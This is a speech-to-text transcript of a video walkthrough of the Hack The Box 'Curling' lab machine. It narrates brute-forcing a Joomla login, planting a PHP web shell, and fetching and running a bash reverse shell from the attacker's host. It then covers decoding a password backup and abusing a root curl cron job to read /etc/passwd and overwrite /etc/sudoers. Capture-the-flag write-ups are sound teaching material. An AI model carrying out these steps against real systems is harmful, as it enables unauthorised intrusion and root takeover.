 what's going on YouTube this is if site can be doing curling from hack the box which was a relatively fun and straightforward machine it struts off with the Gemma web page that has hints on it and how to get a username and password to log in you do some magic get that information log in and you notice you're an administrator and that means you can drop PHP code that when executed you get a reverse shell with the reverse shell you try to read users our text notice you can't read it because you need to be the florists user but there is a hex dump file called password backup that once you do some magic with that file you get the password for florists and you can law again you get the user that text and you also notice there's two different files one input one report and you do some changing with input and it modifies what the report file is and most people stopped with just modifying input to grab root our text and put it in report but if you did some digging around on the box either checking like cron tabs logs or just running like PS by you can see what's going on and then abuse what's going on to drop files and other locations other than report and get a full shell to the box so let's just jump in and get going as always we're going to start off with the end map using - SC for default scripts sv underwrite versions oh eight output all formats put in the folder add map and call this curling and then the IP address which is 10 10 10 150 does take some time to run so i've already ran it looking at the results we see just two ports are open we have ssh on port 22 and HTTP on port 80 the server is reporting that it is ubuntu and the HTTP server is apache and then HTTP scripts report that this is going to be a joomla instance so let's go over on the web page and validate that so going to 10 10 10 150 we see a web page called the cool curling site and cool is spelt like the tool so i'm gonna right away just do a cool - h because i don't run this that often and i want - w - right so we do cold out on ten ten ten one five d and this is just gonna build a word list based upon all the words on this page and again I'm doing it just based upon that spelling and then let us do a view on the source to see if there's any plugins or anything like that visible just scrolling down we can see that the meta name that and map have picked up right there that says it is Joomla Oh scrolling down we can see that the default template is in use that is protostar and then just keep scrolling to see if we see anything like a author tag or some user neighbor really anything about the page at all and right at the bottom we see a note that says secret text if we go there we just get some text so I'm going to create this file secret txt put that there and we'll keep that in mind if we look at cold out we have a word list of the page and the next thing I want to do is probably have some type of recon going in the background so I'm gonna run that Jim scan which is just a Joomla vulnerability scanner and we want to do - - URL HTTP 10 10 10 150 probably - easy to enumerate components and I don't see a noun file so I'm just gonna pipe this to T and we'll call this Jim scan no let that run and is there anything else we should take a look at probably not so let's take a look at the Oh probably want to mainly a new rate what version of Joomla this is so I think it's administrator manifest files joomla dot xml maybe yes it is so this file will normally tell you what version of joomla it is the first thing we notice is the copyright is 2018 so we know it's been updated recently and then if we go somewhere let's see oh right here version 3.88 so we know this is a relatively recent version of Joomla and we just Google like Joomla changelog and put this version in we should see it is released May 22nd 2018 and we can search for like Joomla poor vulnerabilities like it spelled correctly let's see it looks like the last core of our nobility was maybe three six five and we're three eight eight so it's three four five I don't see anything around three eight eight you could go to the CVE details and look for a super-high CVE Joomla vulnerability but I know offhand that there hasn't been a major Joomla exploit since this version has been released so we can ignore that and go back to secret text but before we go back to secret text I guess let's look at this zoom scan see if it found anything firewall detector not detected Joomla version we were correct three eight eight correct about no core vulnerabilities directory listing admin page nothing too interesting yet and this is still running so let's go and cat secret text and let's just take a look at this the first thing I normally do to all files is base64 decode them if they just contain alphanumeric things and we get curling in 2018 exclamation point another hint that this is base 64 is it is divisible by four so if we look at this we can see four sets of four if we just echo a single character and then base64 it we can see it's gonna give us an output that is divisible by four we put a bunch of junk we can probably see as well so as you can see the equals are definitely for padding to make this string equal to four if it was like a URL version of base64 then it may not have padding basic C four doesn't always have padding so that can be a bit of a misnomer but generally even if it was encrypted it would be base64 word so you can view in an ASCII and not just bytes so moral of the story is always try to pay sixty-four decode things so with this string curling 2018 I'm gonna guess this is the password so I'm just gonna put this there and I don't like that flower name I'm gonna name it Joomla PW dot txt go back to this gym with vulnerability scanner don't really see anything is just enumerate all the components so let's take a look and try to brute-force away into the website so joomla's default login is at slash administrator or before we do that actually we go back there's one thing I want to point out we see it is written by super user if it was written by the default admin it would probably be administrator and if it was written by a single word thing it may be a natural user you could just guess this because this person signed - space Flores but let's do it with cool because that's what the title of this blog is is cool so we'll take the output of that and run it against this so let's go to foxy proxy tell us to go through but going into burp interceptors on if we click username let's put fuzz and all caps and then a password of curling 2018 bang click login and we want to copy this line and we'll do a WF us - H to get how W fires works we want - W forward this is gonna be cold out then we want probably - d4 data I don't think that no that is here post data so paste this and then the URL which is HTTP 10 10 10 150 / administrator / I think index dot PHP it is indeed that so if you didn't know W fuzz it's going to go through every line in this word list and replace where fuzz is there all caps with each line so if we click go we get a bunch of 303's which is odd because if we send this to repeater pressing control are no do control shift order is switch to that tab click go I get a 200 ok so we kind of to figure out I guess what this variable is but even so every time I do this I'm getting 200 okay if I change information here it's still what you want to do okay so let's try modifying this thing and we get 200 okay denied because as it invalid security token please refresh the page and try again so maybe that's what this is saying I don't know why it's giving me a 303 error does w fuzz have a proxy setting let's see grep - i proxy - p so let's try this - p HTTP 10-10-10 ODOT tends localhost 1 27001 8080 we can probably go off the intercept tab go on to history and let's see if this sends it too many arguments maybe this s be before the URL - P HTTP one 27001 8080 a proxy type correct values our HTML Sox for Sox 5 HTML that just looks wrong let's see let's do w fuzz - H less proxy - P use proxy and format IP : port : type so it probably doesn't want this your eye thing it said HTTP is default I think there we go now we see all the requests going through burp we can control see this and see what this 3 or 3 says 3 or 3 see other so if we go back to repeater maybe if we get rid of a cookie what happens and we see 3 or 3 see other so and then asks us to set our cookie since we don't have it always saying like invalid token I'm assuming that this this piece is tied to or cookie some L so if we click go back to the page to an intercept on resend go back to burp good options intercept server response all the time if we click go oh this isn't the request I want to intercept intercept on this is the request I want click go we can see the response it does have a see surf token if we highlight this turn intercept off turn it back on try to log in with anything buzz and please subscribe click login only for this request we can see what I have in the clipboard the sea surf taken is placed here but again because we keep getting invalid logins or I'm what I'm assuming is invaluable again because we're just getting 200 ok username password don't match yet so yes I'm assuming this sea surf token is tied to the cookie on every bite time we load the page and not something that there's a one-time use type of thing so we just to feed a cookie into w fuzz and then should just work so let's put the password back to curling 2018 copy this entire string go to W fuzz will delete what's in dash D for the post data paste it and again if we go one intercept mode right now we get three or threes but if we add a cookie I believe that is going to be - see go back copy the cookies for W fuzz paste too many arguments I don't know why that's thing maybe - C is not cookie so let's do OH - c-spine for color so W fuzz - H cookie is - B why is it - B I have no idea but - c is for output with colors so if we want we can add - C and we can see colors so now we have every request it's giving a two hundred and dollars and fourteen and lengths or lines that's lines now length so we can hide with - - hl2 hi blinds everything that's 114 now we just let this run to see if any responses come back there are not a hundred and fourteen in length and we got nothing which is odd I'm going to grab - I Flores on cool that should work let's try this one more time let's try instead of 114 would do HC fuh Hyde code and hide all I'm at 200 so tight all 200 requests and I forgot to put an exclamation point and the password for killing 2018 so it helps to copy it correctly so this time we should be good and if you're wondering where that exclamation point for curling 2018 came from remember that was secret text if we pay 60 for decode it we have curling 2018 bang so before I had not put the bang right here and we get a login with Flores and then the next one also says it's good but that's probably just because we authenticated or cookie so any requests we make with this cook or excuse me this cookie may be valid so if we click go on this request if we use the correct password here maybe not I don't know but the very first request is Flores so let's try this we turn we can turn a burp off Flores and then curling 20:18 bang and we get logged into Joomla so the very first thing I do whenever I get like an administrative access to pretty much anything like a CMS like WordPress Joomla etc is I find a way to edit the templates via the web interface because if you can edit the templates the templates normally contain PHP which if you can modify PHP you get code execution so I'm going to go to extension templates and then we can go to protostar and then if we just edit like index dot PHP we could do that we can also just create a new file so let's create the file please subscribe dot PHP and we'll put the contents as PHP system request and comment and I just need to end that parenthesis semicolon there we go this should be good we'll save this file and then if we go to slash pound PHP or not pound we called it please subscribe PHP please subscribe PHP it doesn't exist but that file actually exists in templates protostar please subscribe PHP because if you remember if we go to 10 10 10 150 the template is actually in slash templates protostar and if it was a different if it was um I think B's is the other one if it actually lets me click on index extensions templates templates B's 3 so this one's probably template slash B's 3 if we want to add a file here so it was please subscribe and comment and we can do Who am I and we see dub-dub-dub data so we have code execution so let's just give ourselves a shell the easiest way to do that is just create a bash reverse shell so we'll do make the dub-dub-dub create the file thanks dot sh and then we'll do bash - I dev TCP I think I'm 1010 14 13 I am 1010 1403 about 13 port 9000 1 0 and 1 and again if you don't know what I just typed there it's just if you Google pen test monkey reverse shell cheat sheet it's one of the shells on this site and I tend to use this one the most and when that this doesn't work I try doing something like this and then when we this one works but let's try this we just have to host it with Python - em simple HTTP server on port 80 and we can just go back here and when it says please subscribe dot PHP and comment will do curl 10 10 14 3 / Thanks Sh and then execute that with bash and I forgot to listen on port 9000 1 and we have a reverse shell return to us so the very first thing I always do is try to upgrade so I can have like the up keys and things like that so we'll do which Python to see if that's on the box it is not will do which Python 3 it is so python 3 - the import PTY PTY not spawn then - and then ctrl Z - background it s TTY raw - go hit FG Anna you can't see yourself typing but trust me it is typing and then enter one more time and now we have our up keys and everything like that so let us go to the flash home go to Flores and let's try getting user dot text so if we do a WC - C on user dot txt it probably won't work because we see owner and group owners read right groups read and owner and group is Flores and we are dub dub dub data so try this permission denied but we do see a file that we can read called password underscore backup so if we try to cat that file we see it is a hex dump I'm going to export term is equal to X term so now I can clear the screen and we can see the password dump so I'm going to run a program called x XD - o to reverse it because if we just created a file we do that touch what we'll do let go please sub to 10x XD tab we can see the output is very similar x XD just gives us a hex dump which is line number bytes and X then X then ASCII decoded from this X so we just do x XD Flores password backup - our I think we need - our first we get stuff so we'll send that to one then do file against one it's a B zip archive so we can just do BZ cat on one we get something else so send this to to do file on - we get gzip compressed data so we can do gz cat I think we're actually just Z cat yeah it's just cat for gzip files on to and we get something else and this file begins with BZ so I'm gonna guess this is B zip but send this to three five one three b zip to compress data BZ cat on three we get something else so send this to four we'll do a file against four we see it suppose exit our archive so we can just do a dash X F on four and then do LS and we get passwords dot txt if we added a dash V to this xvf we could see extracted password text if you don't like all these little command-line foo things a really awesome tool is cyber chef by GC IQ I probably got that wrong GCHQ duh but let's do the same thing in this tool because this is amazing so let's cat Flora's password dump our password backup we got all this hex to content so we can put this over an input and we see output here and then we go to recipes right here so let's search for hex to see all the operations we got from hex dump so put this here and we can see the output down here so let's search for a file operation let's see is there a identify file type I know there is detect file type so we can see the extension is B zip so b zip decompress we'll put this between hex dump and detect file type now we see it is gzip so we just do GZ and if we look at gzip this one says compress data so this doesn't do anything we can double click to delete it but gun zip says it decompresses data so put that there now it says B zip - so BZ easy decompress put it on these guns if then we get tar deer tar we probably want hunter put that here and we get unknown follow tight so we can just disable this operation for now and says one file has been found if we click password text we get the same exact thing we had before so cyber chef is a really cool tool for doing a lot of things definitely would recommend checking it out but we can't password text we get this and I'm not going to bother base64 decoding it because these are not valid based 64 characters so we just do sq - on Flores we can get in and we can also SSH for us at 10 10 10 150 and login so now we can do WCC on user that text see it's 30 30 characters which is 32 for the md5 hash and then a line break so we could have got that file there is this admin area and we couldn't get into admin area before because again it is just read/write/execute for root and then Flores can read and execute it so we were dubbed up the data before which meant we couldn't get into this directory so going in here we see two files input and report if we do LS - la we can see both files March 20th about this 20 seconds ago so if we can't input we see it's just HTTP one 27001 if we can't report we get the HTML source of the root of the page so if we go back to a netcat show let's just send this to Payne 3 and let's test this input file so if we do input and change the URL to 10 10 14 3 please sub save this cat input we have that there and we'll wait to see if we get a hit on or a simple HTTP server and there we go we got a hit 404 not found because we don't have that file if we look at the contents of report we get the error message saying 404 not found Kroll does have this really cool ability to also do pretty much anything it does more than just this HTTP we specify file colon slash slash slash we can do like Etsy passwd and read that so let's confirm we can do that here so let's do the input and replace this with file Etsy passwd and then we'll do a watch - n one for every second we'll do cat report so every second we are refreshing this report file and in a few seconds we'll see if it turns into the passwd of the server there we go we have a passwd and we know this is the server because it has Flores so you can use the imagination at what would happen if you replaced Etsy passwd with root root text what I want to do now is let's try to find a way to get shell on the box so I'm gonna do file and then slash are slash adverse pool crong tabs where spool crong crong tabs root and see if we can get roots cron so save this do the same thing and wait to see if this updates with the cron entry for root and I know this is running on a cron because well we just can see the file changes we know something's happening so I always check like the scheduled tasks there we go and we can see the command is curl - capital K home floors admin area input then output is admin area report so we control see out of that we can do man curl look at the entry for - capital K and we see that is config and we have an example URL output user agent so let's actually copy this - capital okay so we can just copy this go into input and we can paste and let's do ten ten fourteen three sudo errs and output will be Etsy pseudos and the user agent will be thanks for the SUBSCRIBE before we save this we have to make that studio as file so I'm going to copy Etsy su doors for my Cali machine to my dub dub dub directory and we can edit it so we want to have the user Flores all all and I forget the note pastor V I think and just do no pass to be there but we know her password so we don't have to worry about that so save this then Python simple HTTP server file has been changed since whatever oh we already got the file so if we do sudo su and password for a florists cat was it oh it's inside the chef copy this paste and we a root at curling so if you didn't want to do it through the crontab there's a few other ways we could do this the first being a different file if we just went into her log syslog VAR log and then how'd it get the file  curl commands in here so that would be another place to leak it through just looking at what's going on the box with that I guess maybe LF I as root I don't know what to call that another thing we could do is run a program called piece by so if we do P spy github and I used to do this with just a simple bash script but this one's written and go and much better so I'd use this one nowadays so let's do CD /opt get clone and let's see we go to release we can do piece by 64 small I don't know why I get cloned it if I'm just going to grab the release but W get it bio on to make sure it's a executable start a simple HTTP server and let's download this so curl ten ten fourteen three P spy 64's just - OH we'll just call this piece by so it's downloaded chmod plus x piece by if we execute this it's going to there's a lot of error messages I'm not used to saying piece by - H we can do I guess we'll just run this and we'll just wait for a new process that launches this is going to check every few milliseconds I think and then just watch processes and output them and there we go we see that the cron has started and we can see exactly the command and again that's just watching processes so if we hit this web server 10 10 10 150 maybe we'll instead of doing the reverse shell we can do Who am I and we see that showing up here this also has the ability to watch directories so if we add - D - the arguments - F follow system events we can see every time files get accessed so if we now do LS slash home Floris we can see stuff so that is piece by and that is the video a little bit short I hope you guys still enjoyed it take care and I will see you all next week